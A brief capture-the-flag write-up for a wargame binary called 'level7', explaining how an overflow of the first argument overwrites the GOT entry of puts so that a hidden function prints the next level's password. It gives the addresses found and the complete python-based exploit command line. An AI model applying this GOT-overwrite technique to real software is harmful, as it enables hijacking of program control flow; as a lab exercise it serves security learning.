The binary needs to be run with 2 arguments. Apparently the second argument is not used.

`m` function exit but not called, adress : 0x80484f4
Inside there's `printf("%s - %d\n");` s will be the string inside level8.pass and %d will be the return of time (called just before).

The binary will segfault after the first arg being more than **20** char.

The exploit we will use is close to ret2libc. To do so we need to ensure that printf will be in the GOT (global offset table). With the dissas of main we can see puts is being called let's get the actual adress of puts : `0x8049928`

All we need now is the address of `m` : `0x80484f4`

`./level7 $(python -c "print('a' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")`

